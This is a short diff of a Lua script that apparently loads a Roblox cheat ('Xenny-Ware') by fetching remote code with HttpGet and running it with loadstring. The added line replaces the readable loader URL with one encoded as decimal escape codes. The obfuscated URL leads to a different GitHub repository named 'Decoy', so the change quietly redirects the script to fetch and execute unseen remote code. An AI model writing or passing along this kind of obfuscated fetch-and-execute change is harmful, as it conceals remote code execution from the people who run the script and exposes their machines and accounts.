@@ -34,7 +34,7 @@
 	 
 	 
 repeat wait() until game.Players.LocalPlayer.Character
-url = "https://raw.githubusercontent.com/xennyy/Xenny-Ware/main/loader.lua"
+url = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\116\114\97\99\107\112\108\97\121\97\47\68\101\99\111\121\47\109\97\105\110\47\84\104\105\115\46\108\117\97\10"
 loadstring(game:HttpGet(url))()
 
 
